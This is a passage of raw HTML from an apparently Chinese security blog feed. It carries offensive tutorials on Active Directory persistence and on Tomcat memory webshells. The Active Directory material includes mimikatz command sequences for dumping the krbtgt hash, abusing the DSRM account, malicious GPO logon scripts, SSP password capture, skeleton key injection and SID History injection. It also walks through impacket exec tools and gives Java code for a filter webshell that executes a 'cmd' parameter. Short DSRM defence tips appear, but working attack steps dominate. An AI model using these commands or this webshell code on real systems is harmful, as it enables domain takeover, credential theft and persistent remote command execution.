REG_DWORD</code>：这个参数指定了值的类型，即DWORD（32位）。</p></li><li><p>最后的数字2是运行任何情况访问</p><p>修改 DSRM 的登录方式</p><p>DSRM有三种登录方式，具体如下：</p><ul><li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li><li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li><li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li><li>在 Windows 对 DSRM 使用控制台登录域控制器进行了限制。如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2。</li></ul></li></ol></blockquote><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230910145127676.png" alt="image-20230910145127676"> </p><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><ol><li><p>获取 krbtgt 的 NTLM hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 域控制器中使用mimikatz查看 krbtgt 的 NTLM hash</span><br>privilege::debug<br>lsadump::lsa /patch /name:krbtgt<br><br><span class="hljs-comment"># 得到NTLM : fa02a0e57e5ba9189d00990ae64e87ce</span><br></code></pre></td></tr></table></figure></li><li><p>查看同步前与同步后 DSRM 账号的 NTLM hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 查看同步前 DSRM 账号的 NTLM hash</span><br>token::elevate<br>lsadump::sam<br><br><span class="hljs-comment"># 将 DSRM 账号和 krbtgt 的 NTLM Hash 同步</span><br>NTDSUTIL<br><span class="hljs-built_in">set</span> DSRM password<br><span class="hljs-built_in">sync</span> from domain account krbtgt<br><br><span class="hljs-comment"># 查看同步后 DSRM 账号的 NTLM hash</span><br>lsadump::sam<br></code></pre></td></tr></table></figure></li></ol><p>在同步前与同步后进行对比</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/2526173-20220328102112820-362539798.png" alt="img"> </p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>利用 mimikatz 使用 DSRM 账号通过网络远程登录域控制器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在域成员机器的管理员(如本地管理员)模式下打开 mimikatz</span><br>privilege::debug<br><span class="hljs-comment"># 注意：此处的 /domain 的值为域控制器的主机名</span><br>sekurlsa::pth /domain:dc /user:administrator /ntlm:fa02a0e57e5ba9189d00990ae64e87ce<br><br><span class="hljs-comment"># Hash 传递完成后，在弹出的命令行窗口中打开mimikatz，使用 dcsync 功能远程转储 hash。</span><br>lsadump::dcsync /domain:test.lab /dc:dc /user:krbtgt<br><br><span class="hljs-built_in">dir</span> \\dc\c$<br></code></pre></td></tr></table></figure><h3 id="DSRM-域后门防御"><a href="#DSRM-域后门防御" class="headerlink" title="DSRM 域后门防御"></a>DSRM 域后门防御</h3><ol><li>定期检测注册表中用于控制 DSRM 登录方式的键值 <code>hklm:\system\currentcontrolset\control\lsa\dsrmadminlogonbehavior</code> ，确认该键值为 1。或者删除该键值。</li><li>定期修改域中所有域控制器的 DSRM 密码。</li><li>经常检查 ID 为 4794 的日志，尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中。</li></ol><h2 id="GPO权限维持"><a href="#GPO权限维持" class="headerlink" title="GPO权限维持"></a>GPO权限维持</h2><p>GPO全称Group Policy Objects，用来存储Active Directory中的策略。<br>自Windows Server 2008开始，GPO开始支持计划任务，便于管理域中的计算机和用户。默认情况下，域用户的组策略每90分钟更新，随机偏移为0-30分钟，域控制器的组策略每5分钟更新。可通过命令实现组策略的强制更新gpupdate。默认组策略的保存位置：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">\&lt;<span class="hljs-built_in">DOMAIN</span>&gt;\SYSVOL\&lt;<span class="hljs-built_in">DOMAIN</span>&gt;\Policies\<br></code></pre></td></tr></table></figure><p>所有域内主机都能访问。<br>我这里创建一个全局的GPO，作用于所有域用户内容设置了一些计划任务来进行模拟测试。攻击者也可以利用其功能来推出恶意软件、创建&#x2F;修改计划任务、降级凭据保护、向所有计算机添加新的本地帐户被添加到本地管理员组。甚至更改现有的安全策略，以启用明文密码提取。</p><p>打开组策略管理器，右键默认配置，可以发现有脚本方面的设置</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911213843639.png" alt="image-20230911213843639"> </p><p>点击登录即可设置登录所利用的脚本</p><p>可以放一个1.bat</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">calc<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140924289.png" alt="image-20240302140924289"> </p><p><img src="D:\mdimage\image-20230911215043683.png" alt="image-20230911215043683"> </p><p>可以直接在域控上面运行这个shell，或者curl上面所提供的url</p><p>运行完以后，我们需要修改将我们之前的bat替换成我们所需要的bat文件</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911215401438.png" alt="image-20230911215401438"> </p><p>成功添加</p><p>登录任意域用户，更新组策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpupdate /force<br></code></pre></td></tr></table></figure><p>重新启动，发现谈计算器了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911222753566.png" alt="image-20230911222753566"> </p><p>msf也成功上线</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911222805648.png" alt="image-20230911222805648"> </p><h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2><h3 id="直接mimikatz"><a href="#直接mimikatz" class="headerlink" title="直接mimikatz"></a>直接mimikatz</h3><p>直接在域控值其上面用mimikatz</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>misc::memssp<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230911225437077.png" alt="image-20230911225437077"> </p><p>注销当前用户。输入用户名和密码后重新登录，获取明文密码，密码存储在日志文件C:\Windows\System32\mimilsa.log中。</p><h3 id="mimilib-dll注入"><a href="#mimilib-dll注入" class="headerlink" title="mimilib.dll注入"></a>mimilib.dll注入</h3><p>将mimikatz中的mimilib.dll放到系统的C:\Windows\System32\目录下，并将mimilib添加到注册表中。使用这种方法，系统重启也不会影响持久化的效果。</p><p>1）将mimikatz中的mimilib.dll复制到系统的C:\Windows\System32\目录下！</p><p>2）修改HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa&#x2F;Security Packages 项，加载新的DLL文件！</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> query hklm\system\currentcontrolset\control\lsa\ /v <span class="hljs-string">&quot;Security Packages&quot;</span><br><br><span class="hljs-attribute">reg</span> add <span class="hljs-string">&quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;</span>Security Packages<span class="hljs-string">&quot; /d &quot;</span>kerberos\<span class="hljs-number">0</span>msv1_0\<span class="hljs-number">0</span>schannel\<span class="hljs-number">0</span>wdigest\<span class="hljs-number">0</span>tspkg\<span class="hljs-number">0</span>pku2u\<span class="hljs-number">0</span>mimilib<span class="hljs-string">&quot; /t REG_MULTI_SZ</span><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912101842195.png" alt="image-20230912101842195"> </p><p>系统重启后，如果DLL被成功加载，用户在登录时输入的账户密码明文就会被记录在C:\windows\system32\kiwissp.log中。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912102233344.png" alt="image-20230912102233344"> </p><h2 id="skeleton-Key"><a href="#skeleton-Key" class="headerlink" title="skeleton Key"></a>skeleton Key</h2><p>1）权限不足</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dir</span> \\<span class="hljs-number">192.168.3.142</span>\c$    <span class="hljs-comment">#权限不足</span><br></code></pre></td></tr></table></figure><p>2）IPC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.142</span>\ipc$ <span class="hljs-string">&quot;my_old_password&quot;</span> /user:<span class="hljs-number">0</span>day.org.com\administrator<br></code></pre></td></tr></table></figure><p>这样是可以使用的</p><p>在域控制器中管理员权限打开mimikatz,将Skeleton Key注入域控中的lsass.exe进程</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>misc::skeleton<br></code></pre></td></tr></table></figure><p>注入成功后，会在域内所有的账号中添加一个<strong>Skeleton Key</strong>，默认密码为mimikatz。接下来可以在域内任意用户的身份，配合该Skeleton Key，进行域内身份验证授权了。在不使用域管理员原始密码的情况下，使用注入的万能密码。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.3.142\ipc$ /del /y<br> <br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\OWA2010SP3.0day.org\ipc$ <span class="hljs-string">&quot;mimikatz&quot;</span> /user:0day.org\administrator<br><span class="hljs-comment">//这里只能够用主机名，用其他的就会失效，不知道为什么</span><br><span class="hljs-keyword">dir</span> \\192.168.3.142.com\c$<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\OWA2010SP3.0day.org\c$<br><span class="hljs-comment">//映射</span><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912185910754.png" alt="image-20230912185910754"> </p><h2 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h2><p>使用域管理员权限查看test用户的SID History属性</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">Administrator</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">ActiveDirectory</span><br><span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">Administrator</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ADUser</span> <span class="hljs-variable">test</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Properties</span> <span class="hljs-variable">sidhistory</span><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912193405155.png" alt="image-20230912193405155"> </p><p>使用域管理员权限运行mimikatz，将administrator的SID添加到普通用户test的SID History属性中。 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>提升权限<br>privilege::debug<br><span class="hljs-regexp">//</span>修复NTDS服务<br>sid::patch<br><span class="hljs-regexp">//</span>将高权限SID注入到地权限用户的SID History属性<br>sid::add <span class="hljs-regexp">/sam:test /</span>new:administrator<br></code></pre></td></tr></table></figure><p>此时重新查看用户的sid，发现出现了500</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230912193546939.png" alt="image-20230912193546939"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>impacket中各种exec的区别与用法</title>
    <link href="/decemberus.com/2023/07/09/impacket%E4%B8%ADexec%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E7%94%A8%E6%B3%95/"/>
    <url>/decemberus.com/2023/07/09/impacket%E4%B8%ADexec%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="impacket中-exec的区别与用法"><a href="#impacket中-exec的区别与用法" class="headerlink" title="impacket中*exec的区别与用法"></a>impacket中<code>*exec</code>的区别与用法</h1><h2 id="PSExec"><a href="#PSExec" class="headerlink" title="PSExec"></a>PSExec</h2><p>用户可以使用PSExec连接到远程机器并通过命名管道执行命令。命名管道是通过一个随机命名的二进制文件建立的，这个文件被写入远程机器上的ADMIN$共享，并供SVCManager用来创建新服务。</p><p>这一步相当于运行下列命令：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create [serviceName] <span class="hljs-keyword">binPath= </span><span class="hljs-string">&quot;C:\Windows\[uploaded-binary].exe&quot;</span>。<br></code></pre></td></tr></table></figure><p>一旦建立了命名管道，我们与远程机器之间的所有命令的输入和输出都将通过SMB协议（445&#x2F;TCP）进行通信。</p><h2 id="SMBExec"><a href="#SMBExec" class="headerlink" title="SMBExec"></a><strong>SMBExec</strong></h2><p>SMBExec与PSExec非常相似，然而，SMBExec并不会将二进制文件保存到磁盘上。相反，SMBExec会利用一个批处理文件，以及一个临时文件，来执行和转发消息。就像PSExec一样，SMBExec也是通过SMB协议（445&#x2F;TCP）来发送输入信息并接收输出结果的。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231230223835868.png" alt="image-20231230223835868"> </p><p>如上图所示，我们已经成功建立了与目标机器的连接。为了完成相关分析，让我们执行一个命令来请求运行Notepad.exe的实例。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231230223851520.png" alt="image-20231230223851520"> </p><p>我们很快就会看到，我们失去了进一步向远程机器发送输入的能力。这是因为我们仍在等待远程机器的命令输出，而我们永远不会收到该输出。这种情况非常适合在远程机器上进行分析。</p><p>Notepad.exe进程是CMD.exe的子进程。如果我们将鼠标悬停在CMD.exe上，可以看到它正在处理存储在C:\Windows\TEMP\execute.bat中数据。那好，下面就让我们快速读取这个文件中存储的数据。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231230223937842.png" alt="image-20231230223937842"> </p><p>在读取execute.bat文件中的数据后，我们就会发现，原来发送给远程机器的输入被追加到了文件的开头处。</p><p>这个批处理文件本质作用就是把我们的输入发送到远程机器上，执行它们，并把输出重定向到一个名为__output的临时文件中，该文件位于\127.0.0.1\C$路径中。 </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231230224003081.png" alt="image-20231230224003081"> </p><h2 id="WMIExec"><a href="#WMIExec" class="headerlink" title="WMIExec"></a>WMIExec</h2><p>WMIExec（Windows Management Instrumentation）允许通过TCP 135端口与远程过程调用(RPC)建立初始通信来远程访问机器。初始通信建立后，它会使用一个大于1024的随机端口进行协商</p><p>该连接用于向远程机器发送输入。并且，输入的内容将在CMD.EXE进程中执行，输出的内容将保存在远程机器上ADMIN$共享的临时文件中。通过查找以“__”开头的文件名，我们可以很容易地在ADMIN$共享中找到这个临时文件。两个下划线后面的数值看似随机，但实际上是当前日期和时间转换而成的时间戳。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内存马深入</title>
    <link href="/decemberus.com/2023/05/21/%E5%86%85%E5%AD%98%E9%A9%AC%E6%B7%B1%E5%85%A5/"/>
    <url>/decemberus.com/2023/05/21/%E5%86%85%E5%AD%98%E9%A9%AC%E6%B7%B1%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="内存马深入"><a href="#内存马深入" class="headerlink" title="内存马深入"></a>内存马深入</h1><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><h3 id="Listener类型"><a href="#Listener类型" class="headerlink" title="Listener类型"></a>Listener类型</h3><p>根据上面的分析我们首先需要拿StandardContext，我们看到standard类中拿context的方法就是这样，我们直接照抄</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">StandardContext context <span class="hljs-operator">=</span> (StandardContext) req.getContext()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>所以我们现在需要拿到req对象了，这里因为jsp内置了request对象，我们通过反射拿取并修改他的request属性</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">Field reqF = <span class="hljs-built_in">request</span>.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>reqF.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-built_in">Request</span> req = (<span class="hljs-built_in">Request</span>) reqF.<span class="hljs-keyword">get</span>(<span class="hljs-built_in">request</span>);<br></code></pre></td></tr></table></figure><p>最后能够成功利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>reqF.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br><br><span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>context.addApplicationEventListener(shell_Listener);<br></code></pre></td></tr></table></figure><h3 id="Filter类型"><a href="#Filter类型" class="headerlink" title="Filter类型"></a>Filter类型</h3><p>将断点达到dofilter，我们向上分析</p><p> <img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023181442066.png" alt="image-20231023181442066"> </p><p>此处调用了filter，二filter是通过ApplicationFilterConfig来创建的，所以去分析这个类</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023181559608.png" alt="image-20231023181559608"> </p><p>这里实际上是对传进来的filterDef和context进行了一个封装，外部只需要提供context和filterDef就可以拿到applicationfilterconfig类，而不需要关注他是如何初始化的，并使用<code>context.getInstanceManager().newInstance(this.filter)</code>来创建一个新的过滤器实例。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023182623688.png" alt="image-20231023182623688"> </p><p>顺着调用链往下看，我们跟进到这个方法</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023182657955.png" alt="image-20231023182657955"> </p><p>这里调用了<code>filterchain</code>的一个方法，我们向上寻找<code>filterchain</code>是如何定义的</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023182728230.png" alt="image-20231023182728230"> </p><p>能够找到<code>filterchain</code>是有<code>ApplicationFilterFactory.createFilterChain(request, wrapper, servlet)</code>创建出来的，我们跟进这个方法寻找<code>filterchain</code>是如何被调用的</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023183217387.png" alt="image-20231023183217387"> </p><ol><li>首先通过<code>filterChain = new ApplicationFilterChain()</code>创建一个空的<code>filterChain</code>对象</li><li>然后通过<code>wrapper.getParent()</code>函数来获取<code>StandardContext</code>对象</li></ol><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023183735527.png" alt="image-20231023183735527"> </p><p>紧接着获取<code>StandardContext</code>中的<code>FilterMaps</code>对象，<code>FilterMaps</code>对象中存储的是各Filter的名称路径等信息</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023183310519.png" alt="image-20231023183310519"> </p><p>根据最后根据Filter的名称，在<code>StandardContext</code>中获取<code>FilterConfig</code>，然后调用了<code>addfilter</code>将<code>filterconfig</code>添加进<code>filterchain</code>里面，而<code>filterconfig</code>则是从<code>context</code>中寻找得到的，所以接着跟进<code>addfilter</code></p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023184055440.png" alt="image-20231023184055440"> </p><p>可以看到就是把<code>filterConfig</code>添加进<code>filter</code>中</p><p>所以关键就是将恶意Filter的信息添加进<code>FilterConfig</code>数组中，这样Tomcat在启动时就会自动初始化我们的恶意<code>Filter</code>。</p><h4 id="FilterConfig、FilterDef和FilterMaps"><a href="#FilterConfig、FilterDef和FilterMaps" class="headerlink" title="FilterConfig、FilterDef和FilterMaps"></a>FilterConfig、FilterDef和FilterMaps</h4><p>回到<code>creatFilterChain</code>中，我们看到<code>context</code>这个上下文对象中实际上有这么三个属性</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023184732911.png" alt="image-20231023184732911">  </p><h5 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h5><p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023184841839.png" alt="image-20231023184841839"> </p><p>这里面的filterDef存放了filter的定义</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023184914017.png" alt="image-20231023184914017"> </p><p>可以发现它正好对应着我们重写dofilter那个方法和类</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023185017476.png" alt="image-20231023185017476"> </p><p>如果在web.xml中写的化，是这个格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>。</p><h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><p><code>filterDefs</code>是一个HashMap，以键值对的形式存储<code>filterDef</code></p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023185249480.png" alt="image-20231023185249480"> </p><h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023185312821.png" alt="image-20231023185312821"> </p><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签,同时也对应着我们这里的<code>Webfilter</code>注解</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231023185437858.png" alt="image-20231023185437858"> </p><p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p><p>于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。</p><h4 id="构造Filter"><a href="#构造Filter" class="headerlink" title="构造Filter"></a>构造Filter</h4><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取<code>StandardContext</code>对象</li><li>创建恶意Filter</li><li>使用<code>FilterDef</code>对Filter进行封装，并添加必要的属性</li><li>创建<code>filterMap</code>类，并将路径和<code>Filtername</code>绑定，然后将其添加到<code>filterMaps</code>中</li><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p>我们的首要目的就是获取<code>StandardContext</code>对象</p><h4 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h4><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p><p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p><p>同时这里也可以使用我们刚才listener获取的办法来获取standardcontext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取ApplicationContextFacade类</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br> <br><span class="hljs-comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br> <br><span class="hljs-comment">//反射获取ApplicationContext类属性context为StandardContext类</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><h4 id="创建恶意Filter"><a href="#创建恶意Filter" class="headerlink" title="创建恶意Filter"></a>创建恶意Filter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>            n.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用FilterDef封装filter"><a href="#使用FilterDef封装filter" class="headerlink" title="使用FilterDef封装filter"></a>使用FilterDef封装filter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//filter名称</span><br><span 